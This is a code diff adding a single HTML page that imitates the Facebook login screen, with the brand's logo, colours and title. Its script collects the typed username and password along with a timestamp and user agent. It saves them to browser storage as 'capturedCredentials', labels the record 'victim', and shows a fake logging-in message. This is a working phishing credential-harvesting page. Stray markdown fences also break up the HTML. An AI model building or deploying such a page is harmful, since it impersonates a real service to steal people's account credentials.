@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+```
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        background: linear-gradient(135deg, #e0f2fe 0%, #ddd6fe 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 450px;
+    }
+
+    .login-card {
+        background: white;
+        border-radius: 16px;
+        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+        padding: 40px;
+    }
+
+    .logo-container {
+        text-align: center;
+        margin-bottom: 32px;
+    }
+
+    .logo {
+        width: 64px;
+        height: 64px;
+        background: #1877f2;
+        border-radius: 50%;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 16px;
+    }
+
+    .logo-text {
+        color: white;
+        font-size: 36px;
+        font-weight: bold;
+    }
+
+    .title {
+        font-size: 24px;
+        font-weight: bold;
+        color: #1f2937;
+        margin-bottom: 8px;
+    }
+
+    .subtitle {
+        color: #6b7280;
+        font-size: 14px;
+    }
+
+    .form-group {
+        margin-bottom: 16px;
+    }
+
+    .label {
+        display: block;
+        font-size: 14px;
+        font-weight: 500;
+        color: #374151;
+        margin-bottom: 8px;
+    }
+
+    .input-wrapper {
+        position: relative;
+    }
+
+    .input-icon {
+        position: absolute;
+        left: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #9ca3af;
+    }
+
+    .input-field {
+        width: 100%;
+        padding: 12px 12px 12px 44px;
+        border: 2px solid #d1d5db;
+        border-radius: 8px;
+        font-size: 16px;
+        transition: border-color 0.2s;
+    }
+
+    .input-field:focus {
+        outline: none;
+        border-color: #3b82f6;
+    }
+
+    .input-field-password {
+        padding-right: 44px;
+    }
+
+    .toggle-password {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: #9ca3af;
+        padding: 4px;
+    }
+
+    .toggle-password:hover {
+        color: #4b5563;
+    }
+
+    .btn-primary {
+        width: 100%;
+        background: #1877f2;
+        color: white;
+        font-weight: 600;
+        padding: 12px 16px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+
+    .btn-primary:hover {
+        background: #1464d8;
+    }
+
+    .btn-primary:disabled {
+        background: #93c5fd;
+        cursor: not-allowed;
+    }
+
+    .forgot-link {
+        display: block;
+        text-align: center;
+        margin-top: 16px;
+        color: #1877f2;
+        text-decoration: none;
+        font-size: 14px;
+    }
+
+    .forgot-link:hover {
+        text-decoration: underline;
+    }
+
+    .divider {
+        margin: 24px 0;
+        padding-top: 24px;
+        border-top: 1px solid #e5e7eb;
+        text-align: center;
+    }
+
+    .btn-secondary {
+        background: #16a34a;
+        color: white;
+        font-weight: 600;
+        padding: 12px 24px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+
+    .btn-secondary:hover {
+        background: #15803d;
+    }
+
+    .success-message {
+        background: #dcfce7;
+        border: 2px solid #16a34a;
+        border-radius: 8px;
+        padding: 12px;
+        margin-top: 16px;
+        text-align: center;
+        color: #15803d;
+        font-weight: 600;
+        display: none;
+    }
+</style>
+```
+
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo-container">
+                <div class="logo">
+                    <span class="logo-text">f</span>
+                </div>
+                <h1 class="title">Log in to Facebook</h1>
+                <p class="subtitle">Connect with friends and the world around you</p>
+            </div>
+
+```
+        <div>
+            <div class="form-group">
+                <label class="label">Email or Phone</label>
+                <div class="input-wrapper">
+                    <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="12" cy="7" r="4"></circle>
+                    </svg>
+                    <input 
+                        type="text" 
+                        id="username" 
+                        class="input-field" 
+                        placeholder="Enter your email or phone"
+                    />
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="label">Password</label>
+                <div class="input-wrapper">
+                    <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    <input 
+                        type="password" 
+                        id="password" 
+                        class="input-field input-field-password" 
+                        placeholder="Enter your password"
+                    />
+                    <button type="button" class="toggle-password" onclick="togglePassword()">
+                        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <button class="btn-primary" id="loginBtn" onclick="handleLogin()">Log In</button>
+
+            <div class="success-message" id="successMsg">
+                ✓ Logging you in...
+            </div>
+
+            <a href="#" class="forgot-link">Forgot password?</a>
+
+            <div class="divider">
+                <button class="btn-secondary">Create New Account</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    function togglePassword() {
+        const passwordField = document.getElementById('password');
+        const eyeIcon = document.getElementById('eyeIcon');
+        
+        if (passwordField.type === 'password') {
+            passwordField.type = 'text';
+            eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
+        } else {
+            passwordField.type = 'password';
+            eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
+        }
+    }
+
+    function handleLogin() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        if (!username || !password) {
+            alert('Please enter both username and password');
+            return;
+        }
+
+        const data = {
+            username: username,
+            password: password,
+            timestamp: new Date().toLocaleString(),
+            userAgent: navigator.userAgent,
+            page: 'victim'
+        };
+
+        const existingData = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
+        existingData.push(data);
+        localStorage.setItem('capturedCredentials', JSON.stringify(existingData));
+        localStorage.setItem('newCredential', JSON.stringify(data));
+
+        document.getElementById('successMsg').style.display = 'block';
+        document.getElementById('loginBtn').disabled = true;
+
+        setTimeout(() => {
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('successMsg').style.display = 'none';
+            document.getElementById('loginBtn').disabled = false;
+        }, 3000);
+    }
+
+    document.getElementById('username').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') handleLogin();
+    });
+
+    document.getElementById('password').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') handleLogin();
+    });
+</script>
+```
+
+</body>
+</html>
